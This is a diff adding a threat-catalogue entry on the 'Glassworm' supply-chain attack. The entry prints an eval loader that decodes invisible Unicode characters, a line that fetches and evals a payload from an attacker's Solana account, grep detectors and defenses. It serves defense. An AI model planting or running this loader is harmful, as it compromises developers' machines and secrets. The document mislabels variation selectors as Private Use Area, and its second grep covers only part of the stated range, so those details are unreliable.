@@ -2694,3 +2694,57 @@ let collateral_value = ctx.accounts.vault_usdc.total_deposits * oracle_price / S
 6. **Gradual accumulation detection**: track rolling 30-day collateral inflows per wallet; alert on positions approaching supply cap from a single counterparty
 **Source**: https://hacked.slowmist.io/ | https://allez.xyz/research/venus-protocol-attack-analysis
 
+
+---
+
+## D39. Glassworm: Invisible Unicode PUA Code Injection + Blockchain C2 (2026-03-17)
+
+**Signal**: Active campaign March 3–9, 2026. 151+ GitHub repos compromised (dev.to, 2026-03-14). Novel supply-chain technique — distinct from D28 (typosquat), D38 (CI/CD exploit), A44/A45 (malicious crate publish).
+
+**Mechanism**: Attacker embeds Private Use Area Unicode characters (U+FE00–U+FE0F, U+E0100–U+E01EF) into JS/TS source strings. Completely invisible in all major editors, terminals, and GitHub code review UI. A simple decoder maps these characters to nibble values and `eval()`s the reconstructed payload. Stage-2 payload is retrieved from a **Solana account** (censorship-resistant, permanent C2 channel): `conn.getAccountInfo(attackerPubkey)` → `eval(info.data)`.
+
+**Why Solana as C2**:
+- Solana accounts cannot be taken down (no hosting provider to report to)
+- On-chain data is permanent — payload survives CDN/hosting takedowns
+- Blockchain reads are free, rate-unlimited, IP-log-free
+- Security tools flagging suspicious HTTP calls are blind to Solana RPC calls
+
+**Distinct from D28 (typosquat)**: D28 = wrong crate with similar name. D39 = trusted crate modified *in place* with invisible characters. Reviewer sees correct package + clean-looking diff.
+**Distinct from D38 (AI CI/CD)**: D38 = workflow + agent-instruction file manipulation. D39 = source-string Unicode poisoning; attack surface is the rendering layer of every code review tool.
+**Distinct from A44/A45 (malicious publish)**: A44/A45 = new malicious crate published. D39 = existing trusted crate/repo compromised — bypasses "new crate quarantine" policy entirely.
+
+**Code pattern to find**:
+```javascript
+// INJECTION: invisible PUA characters embedded in a string literal
+// Visually appears as empty string in all editors and diff views:
+const s = v => [...v].map(w => (
+  w = w.codePointAt(0),
+  w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 :
+  w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null
+)).filter(n => n !== null);
+eval(Buffer.from(s(``)).toString('utf-8'));
+// ↑ those backticks look empty — they are NOT
+
+// C2 PAYLOAD FETCH from Solana account:
+const info = await conn.getAccountInfo(new PublicKey('AttackerPubkey...'));
+eval(info.data.toString('utf-8'));
+```
+
+**Detection**:
+```bash
+# Scan for UTF-8 encoded PUA range U+FE00–U+FE0F (variation selectors)
+grep -rP '\xEF\xB8[\x80-\x8F]' . && echo "PUA FOUND"
+# Scan for U+E0100–U+E01EF (variation selectors supplement)
+grep -rP '\xF3\xA0\x84[\x80-\xAF]' . && echo "PUA SUPPLEMENT FOUND"
+```
+
+**Defense**:
+1. Unicode PUA scan in CI on all JS/TS source and `node_modules/` at install time
+2. `eslint-plugin-no-unsanitized` + `eslint-plugin-no-restricted-syntax` on eval/Function constructor
+3. Block Solana RPC calls originating from dev-workstation JS runtime (only keeper Rust binary should call Solana RPC)
+4. Custom `postinstall` hook scanning newly installed npm packages for PUA bytes
+5. Isolate keeper signing key from developer-workstation environments entirely
+
+**Microstable impact**: MEDIUM — core Rust program and keeper are not directly vulnerable; JS/TS test/simulation tooling on developer workstation is the attack surface → keeper hot key + `.openclaw/` secrets exfil risk.
+
+**Source**: https://dev.to/ohmygod/glassworm-how-invisible-unicode-characters-and-solana-are-powering-the-biggest-supply-chain-attack-4a4j
